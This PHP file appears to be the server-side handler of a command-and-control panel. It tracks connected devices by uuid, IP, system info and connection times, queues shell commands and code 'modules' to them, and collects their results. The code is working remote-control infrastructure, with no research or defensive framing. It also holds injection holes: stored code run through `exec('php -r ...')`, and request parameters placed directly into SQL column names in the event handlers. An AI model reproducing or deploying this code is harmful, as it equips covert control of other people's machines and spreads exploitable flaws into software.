<?php
require_once "../../config/db.php";
require_once "../../config/function.php";
global $connection;
if (isset($_POST['data'])) {
    $sql = $connection->prepare("SELECT uuid,ip,info,f_connection,l_connection,status,label FROM users");
    $sql->execute();
    $data = $sql->fetchAll(PDO::FETCH_ASSOC);

    foreach ($data as $key => $device) {
        $ip = $device['ip'];
        $uuid = $device['uuid'];
        $info = $device['info'];
        $first_connection = $device['f_connection'];
        $last_connection = $device['l_connection'];
        $status = $device['status'];
        $label = $device['label'];
        $list[$key] = [$ip, $uuid, unserialize($info), $first_connection, $last_connection, $status, $label];
    }


    echo json_encode($list);
}
if (isset($_POST['offline'])) {
    $sql = $connection->prepare("UPDATE `users` SET `status` =0 ");
    $sql->execute();
}
if (isset($_POST['get_command'])) {
    $uuid = clear_string($_POST['uuid']);
    $cmd_uid = $_POST['cmd_uid'];
    $sql = $connection->prepare("SELECT * FROM command WHERE uuid=? and cmd_uid=? and status=1");
    $sql->bindValue(1, $uuid);
    $sql->bindValue(2, $cmd_uid);
    $sql->execute();
    if ($sql->rowCount() >= 1) {
        $data = $sql->fetch(PDO::FETCH_ASSOC);
        echo $data['result'];
    } else {
        echo "Client Offline Or Wait For Send Results";
    }
}
if (isset($_POST['system_info'])) {
    $uuid = clear_string($_POST['uuid']);
    $sql = $connection->prepare("SELECT info FROM users WHERE uuid=?");
    $sql->bindValue(1, $uuid);
    $sql->execute();
    if ($sql->rowCount() >= 1) {
        $data = $sql->fetchAll(PDO::FETCH_ASSOC);
        $info = unserialize($data[0]['info']);
        echo json_encode($info);
    }
}
if (isset($_POST['history_command'])) {
    $uuid = clear_string($_POST['uuid']);
    $cmd_uid = $_POST['cmd_uid'];
    $sql = $connection->prepare("SELECT * FROM command WHERE uuid=? ORDER BY id DESC");
    $sql->bindValue(1, $uuid);
    $sql->execute();
    if ($sql->rowCount() >= 1) {
        $data = $sql->fetchAll(PDO::FETCH_ASSOC);
        echo json_encode($data);
    }
}


if (isset($_POST['module_option'])) {

    $sql = $connection->prepare("SELECT name,args,place_holder FROM module WHERE type=1 ");
    $sql->execute();
    $data = $sql->fetchAll(PDO::FETCH_ASSOC);
    echo json_encode($data);
}
if (isset($_POST['variable_option'])) {

    $sql = $connection->prepare("SELECT name,args,place_holder FROM module WHERE type=2 ");
    $sql->execute();
    $data = $sql->fetchAll(PDO::FETCH_ASSOC);
    echo json_encode($data);
}
if (isset($_POST['variable_exec'])) {
    $name = $_POST['command'];
    $sql = $connection->prepare("SELECT name,code FROM module WHERE type=2 and name=? ");
    $sql->bindValue(1, $name);
    $sql->execute();
    $data = $sql->fetch(PDO::FETCH_ASSOC);
    $code = $data['code'];
    $cmd = escapeshellarg(exec("php -r \"$code\""));
    $replace = str_replace('"', "", $cmd);
    echo $replace;
}
if (isset($_POST['module_edit']) and isset($_POST['name']) and !empty($_POST['name'])) {
    $name = $_POST['name'];
    $sql = $connection->prepare("SELECT name,args,place_holder,code FROM module WHERE name=?  ");
    $sql->bindValue(1, $name);
    $sql->execute();
    $data = $sql->fetchAll(PDO::FETCH_ASSOC);
    echo json_encode($data);
}
if (isset($_POST['delete_user'])) {

    $uuid = clear_string($_POST['uuid']);
    $sql = $connection->prepare("DELETE FROM `users` WHERE uuid=?");
    $sql->bindValue(1, $uuid);
    $sql->execute();
    $sql = $connection->prepare("DELETE FROM `command` WHERE uuid=?");
    $sql->bindValue(1, $uuid);
    $sql->execute();
    recursiveDelete("../../users/$uuid");
    echo "ok";
}
if (isset($_POST['delete_module'])) {
    $name = clear_string($_POST['name']);
    $sql = $connection->prepare("DELETE FROM `module` WHERE name=? ");
    $sql->bindValue(1, $name);
    $sql->execute();
}
if (isset($_POST['delete_command'])) {
    $uuid = clear_string($_POST['uuid']);
    $cmd_uid = $_POST['cmd_uid'];
    $sql = $connection->prepare("DELETE FROM `command` WHERE cmd_uid = ? and uuid=?");
    $sql->bindValue(1, $cmd_uid);
    $sql->bindValue(2, $uuid);
    $sql->execute();
}
if (isset($_POST['rerun_command'])) {
    $uuid = clear_string($_POST['uuid']);
    $cmd_uid = $_POST['cmd_uid'];
    $sql = $connection->prepare("UPDATE `command` SET `status` = '0'  WHERE cmd_uid = ? and uuid=?");
    $sql->bindValue(1, $cmd_uid);
    $sql->bindValue(2, $uuid);
    $sql->execute();
}
if (isset($_POST['set_label'])) {
    $label = htmlspecialchars(trim($_POST['name']));
    $uuid = clear_string($_POST['uuid']);
    $sql = $connection->prepare("UPDATE `users` SET `label` = ?  WHERE uuid = ? ");
    $sql->bindValue(1, $label);
    $sql->bindValue(2, $uuid);
    $sql->execute();
}
if (isset($_POST['add_command'])) {
    $uuid = clear_string($_POST['uuid']);
    if (!isset($uuid) or empty($uuid)) {
        echo "empty_uuid";
        die();
    } else {

        $command = clear_string($_POST['command']);

        $code = clear_string($_POST['code']);
        $sql = $connection->prepare("SELECT * FROM module WHERE type=1");
        $sql->execute();
        $data = $sql->fetchAll(PDO::FETCH_ASSOC);

        $address = $_SERVER['SERVER_NAME'] . ":" . $_SERVER['SERVER_PORT'] . $_SERVER['PHP_SELF'];
        $sql = $connection->prepare("SELECT * FROM module WHERE type=2");
        $sql->execute();
        $data_var = $sql->fetchAll(PDO::FETCH_ASSOC);
        $variable = array();
        // get  global variable
        foreach ($data_var as $key => $var) {
            $code = trim($var['code']);
            $cmd = escapeshellarg(exec("php -r \"$code\""));
            $variable[$var['name']] = $cmd;
        }
        // replace command global variable

        foreach ($variable as $key => $var) {
            $command = str_replace("$key", $variable["$key"], $command);
        }




        foreach ($data as $user_module) {
            if (in_array($command, $user_module)) {
                $args_count = $user_module['args'];
                $data_code = clear_string($user_module['code']);
                // replace  global variable in module
                foreach ($variable as $key => $var) {
                    $data_code = str_replace("$key", $variable["$key"], $data_code);
                }




                if ($args_count > 0) {

                    if (isset($_POST['args']) and !empty($_POST['args'])) {
                        $args = $_POST['args'];
                        // replace  global variable in args
                        foreach ($variable as $key => $var) {
                            $args = str_replace("$key", $variable["$key"], $args);

                        }


                        $break = explode("^^", $args);

                        foreach ($break as $key => $args) {
                            $data_code = str_replace('$a' . $key, $args, $data_code);
                            $command = $data_code;
                        }
                    }
                } else {
                    $command = $data_code;
                }
            }
        }


        $cmd_uid = rand();
        $sql = $connection->prepare("INSERT INTO `command` (`cmd`, `uuid`,  `cmd_uid`) VALUES (?,?,?);");
        $sql->bindValue(1, $command);
        $sql->bindValue(2, $uuid);
        $sql->bindValue(3, $cmd_uid);
        $sql->execute();
        echo $cmd_uid;
    }

}
if (isset($_POST['add_module'])) {
    if (!isset($_POST['name']) or empty(trim($_POST['name']))) {
        echo "empty_name";
        die();
    }
    if (!isset($_POST['code']) or empty(trim($_POST['code']))) {
        echo "empty_code";
        die();
    }
    $name = clear_string($_POST['name']);

    $sql = $connection->prepare("SELECT name FROM module WHERE name=? and type=1 ");
    $sql->bindValue(1, $name);
    $sql->execute();
    if ($sql->rowCount() >= 1) {
        echo "exist";
        die();
    } else {

        $code = clear_string($_POST['code']);
        $args_count = clear_string($_POST['args']);
        $placeholder = clear_string($_POST['placeholder']);
        $sql = $connection->prepare("INSERT INTO `module` (`name`, `code`,  `args`,`place_holder`) VALUES (?,?,?,?);");
        $sql->bindValue(1, $name);
        $sql->bindValue(2, $code);
        $sql->bindValue(3, $args_count);
        $sql->bindValue(4, $placeholder);
        $sql->execute();
        echo "ok";
    }
}


if (isset($_POST['update_module'])) {
    if (!isset($_POST['name']) or empty(trim($_POST['name']))) {
        echo "empty_name";
        die();
    }
    if (!isset($_POST['code']) or empty(trim($_POST['code']))) {
        echo "empty_code";
        die();
    }

    if (!isset($_POST['old_name']) or empty(trim($_POST['old_name']))) {
        echo "old_name";
        die();
    }

    $name = clear_string($_POST['name']);
    $old_name = clear_string($_POST['old_name']);



    $code = clear_string($_POST['code']);
    $args_count = clear_string($_POST['args']);
    $placeholder = clear_string($_POST['placeholder']);
    $sql = $connection->prepare("UPDATE `module` SET `name` = ?,`code` = ?,`args` = ?,`place_holder` = ? WHERE `name` = ?");
    $sql->bindValue(1, $name);
    $sql->bindValue(2, $code);
    $sql->bindValue(3, $args_count);
    $sql->bindValue(4, $placeholder);
    $sql->bindValue(5, $old_name);
    $sql->execute();
    echo "ok";

}
if (isset($_POST['update_variable'])) {
    if (!isset($_POST['name']) or empty(trim($_POST['name']))) {
        echo "empty_name";
        die();
    }
    if (!isset($_POST['code']) or empty(trim($_POST['code']))) {
        echo "empty_code";
        die();
    }

    if (!isset($_POST['old_name']) or empty(trim($_POST['old_name']))) {
        echo "old_name";
        die();
    }

    $name = clear_string($_POST['name']);
    $old_name = clear_string($_POST['old_name']);
    $code = clear_string($_POST['code']);

    if (substr($name, 0, 2) === "'$" and substr($name, -1, 1) === "'") {

        $sql = $connection->prepare("UPDATE `module` SET `name`=?,`code`=? WHERE `name` = ?");
        $sql->bindValue(1, $name);
        $sql->bindValue(2, $code);
        $sql->bindValue(3, $old_name);
        $sql->execute();
        echo "ok";
    } else {
        echo "syntax_error";
        die();
    }
}

if (isset($_POST['add_variable'])) {
    if (!isset($_POST['name']) or empty(trim($_POST['name']))) {
        echo "empty_name";
        die();
    }
    if (!isset($_POST['code']) or empty(trim($_POST['code']))) {
        echo "empty_code";
        die();
    }
    $name = clear_string($_POST['name']);
    if (substr($name, 0, 2) === "'$" and substr($name, -1, 1) === "'") {


        $sql = $connection->prepare("SELECT name FROM module WHERE name=? and type=2 ");
        $sql->bindValue(1, $name);
        $sql->execute();
        if ($sql->rowCount() >= 1) {
            echo "exist";
            die();
        } else {

            $code = clear_string($_POST['code']);
            $sql = $connection->prepare("INSERT INTO `module` (`name`, `code`,`type`) VALUES (?,?,?);");
            $sql->bindValue(1, $name);
            $sql->bindValue(2, $code);
            $sql->bindValue(3, 2);
            $sql->execute();
            echo "ok";
        }
    } else {
        echo "syntax_error";
        die();
    }
}

if (isset($_POST['edit_event']) and isset($_POST['name']) and isset($_POST['code']) and !empty($_POST['name'])) {
    $name = $_POST['name'];
    $code = $_POST['code'];
    $sql = $connection->prepare("UPDATE `event` SET `$name` = ? ");
    $sql->bindValue(1, $code);
    $sql->execute();
    echo "ok";
}
if (isset($_POST['show_event']) and isset($_POST['name']) and !empty($_POST['name'])) {
    $name = $_POST['name'];
    $sql = $connection->prepare("SELECT `$name` FROM event");
    $sql->execute();
    $data = $sql->fetch(PDO::FETCH_ASSOC);
    echo $data["$name"];
}